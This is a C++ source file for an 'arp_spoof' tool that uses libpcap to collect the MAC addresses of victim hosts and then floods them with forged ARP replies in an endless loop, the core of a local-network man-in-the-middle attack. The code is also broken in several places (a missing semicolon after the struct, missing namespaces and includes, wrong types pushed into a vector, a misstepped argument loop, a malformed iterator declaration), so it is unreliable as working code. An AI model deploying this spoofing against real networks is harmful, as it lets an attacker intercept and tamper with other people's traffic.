#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <vector>

#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

#include "pcap_handle.h"
#include "pcap_lib.h"

struct Session{
	uint32_t sender_ip;
	uint32_t target_ip;
}

void usage() {
	printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.3\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 == 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	vector<Session> session_array;
	for(int i = 2; i < argc; i++){
		uint32_t sender_ip, target_ip;
		str_to_ip(argv[i], &sender_ip);
		str_to_ip(argv[i+1], &target_ip);
		session_array.push_back(sender_ip);
		session_array.push_back(target_ip);
	}

	// get my ip and my mac
	uint32_t my_ip;
	MAC my_mac;
	s_getIpAddress (dev, (unsigned char*)&my_ip);
	mac_eth0(dev, (unsigned char*)&my_mac);
	print_IP("my IP", my_ip);
	print_MAC("my MAC", my_mac);

	// collect mac	
	map<uint32_t, MAC> m;
	for(vector<Session>::iterator it = session_array.begin();
  		 it != session_array.end();
  		 it++)
  	{
  		uint32_t ip;
  		MAC mac;

  		for(int i = 0; i < 2; i++){
  			switch(i){
  				case 0: ip = it->sender_ip; break;
  				case 1: ip = it->target_ip; break;
  			}

  			if(m.find(ip) != m.end()) continue;

  			get_mac(dev, handle, my_ip, my_mac, ip, &mac);
  			m[ip] = mac;
			print_IP("IP", ip);
			print_MAC("MAC", mac);
  		}
	}

	while(true){
		// send arp
		for(vector<Session::iterator it = session_array.begin();
			it != session_array.end();
			it++)
			send_arp(dev, my_mac, it->target_ip, m[it->sender_ip], it->sender_ip, ARPOP_REPLY);
		
	}

	pcap_close(handle);
	return 0;
}
